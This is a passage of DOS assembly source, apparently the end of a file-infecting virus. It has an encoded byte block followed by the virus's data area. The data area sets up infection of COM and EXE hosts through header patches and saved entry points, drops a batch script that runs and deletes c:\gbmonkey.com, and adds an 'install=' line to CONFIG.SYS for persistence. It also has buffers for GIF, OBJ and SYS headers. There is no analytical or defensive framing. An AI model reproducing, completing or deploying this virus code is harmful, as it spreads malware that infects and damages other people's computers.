db  0b8h,0b1h,0e3h,0c7h,0f2h,7ch,40h,1eh,11h,12h,0c6h,64h,4ch,56h,0fch,0deh
db  33h,80h,0e0h,40h,82h,55h,09h,0fah,0f9h,0d0h,0fch,0cfh,0d5h,0a8h,2bh,0f5h
db  40h,01h,40h,60h,40h,47h,0eh,05h,95h,9dh,0bdh,94h,0f4h,71h,04h,45h
db  4ch,9ch,77h,0ech,80h,0c2h,40h,01h,44h,88h,5ch,84h,99h,0a8h,2dh,2bh
db  6ah,44h,29h,3eh,15h,30h,18h,0a9h,0e3h,69h,6ch,24h,0cfh,2dh,6bh,31h
db  0feh,82h,0d7h,4fh,8eh,55h,84h,4eh,01h,0eeh,0f1h,34h,75h,00h,52h,9ch
db  0b4h,59h,9eh,0efh,97h,0ceh,0e9h,14h,9fh,82h,6fh,0bah,04h,0d5h,13h,29h
db  53h,78h,49h,39h,6fh,0dbh,65h,0fch,31h,0e0h,8fh,0bdh,0b7h,8eh,8ch,7eh
db  71h,0fbh,0afh,41h,41h,87h,6eh,4dh,94h,81h,1ch,77h,0b7h,0a1h,47h,91h
db  0d0h,17h,0c9h,1ch,13h,5fh,19h,0bah,85h,17h,95h,77h,0cdh,0b4h,36h,54h
db  0eh,0bch,0f8h,44h,13h,2eh,45h,75h,0a7h,0e0h,40h,4fh,59h,53h,46h,3eh
db  0e2h,21h,0f3h,04h,1ah,0feh,0dh,13h,13h,2fh,38h,09h,15h,94h,2eh,25h
db  4eh,48h,82h,00h,04h,0d4h,48h,80h,00h,6dh,91h,22h,1fh,86h,0b8h,0ach
db  02h,00h,8dh,37h,0e2h,88h,00h,82h,09h,8eh,00h,18h,20h,39h,5ah,0c1h
db  0e2h,4fh,05h,35h,50h,0c0h,21h,49h,0cah,01h,0cdh,54h,85h,29h,39h,93h
db  2eh,04h,38h,79h,40h,34h,51h,1eh,71h,0eh,95h,0dfh,0a0h,28h,83h,75h
db  0eh,18h,70h,0ceh,5dh,0e0h,88h,69h,04h,34h,60h,41h,70h,24h,5fh,80h
db  0a0h,09h,67h,24h,24h,0cch,39h,48h,02h,0bh,0c8h,69h,0a7h,1eh,60h,0eeh
db  0d9h,86h,67h,7eh,0ah,0d2h,26h,9bh,5fh,05h,0bah,17h,0a1h,7eh,4ah,0d2h
db  0d9h,9bh,95h,3ch,0c2h,42h,0dh,88h,89h,23h,0cfh,0a2h,0d9h,1ch,0b0h,0eh
db  0a5h,0d1h,58h,0eah,58h,67h,7bh,0dh,0a2h,0d8h,0a4h,5bh,32h,0fah,55h,9bh
db  8fh,05h,71h,0c0h,0a9h,96h,92h,0d6h,98h,0a9h,0a8h,5eh,0e6h,0eah,65h,21h
db  00h,00h,3bh
flag_end        label   byte

; ÄÄ´ Data area ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

sys_infection   db      ?
file_flag       db      'C'
host_type       db      'N'

new_com_header  db      0e9h,?,?,';',')'
old_com_header  db      0cdh,20h,90h,90h,90h

exe_cs          dw      0fff0h
exe_ip          dw      ?
exe_ss          dw      ?
exe_sp          dw      ?

batch_start     db      '@echo off',0dh,0ah
                db      'c:\gbmonkey.com',0dh,0ah
                db      'del c:\gbmonkey.com',0dh,0ah
                db      'del c:\winstart.bat',0dh,0ah
batch_end       label   byte

config_sys      db      'c:\config.sys',0
gbmonkey_name   db      'c:\gbmonkey.com',0
winstart_bat    db      'c:\winstart.bat',0
install_add     db      'install='
dropper_name    db      'c:\',0
gib_file_end    label   byte

file_offset     dw      ?
dot_xy          dw      ?
obj_header      db      3 dup (?)
gif_header      db      4 dup (?)
file_name       db      4ch dup (?)
old_sys_header  db      0ch dup (?)
roq_da_roq      db      666h dup (?)
gib_mem_end     label   byte
                end
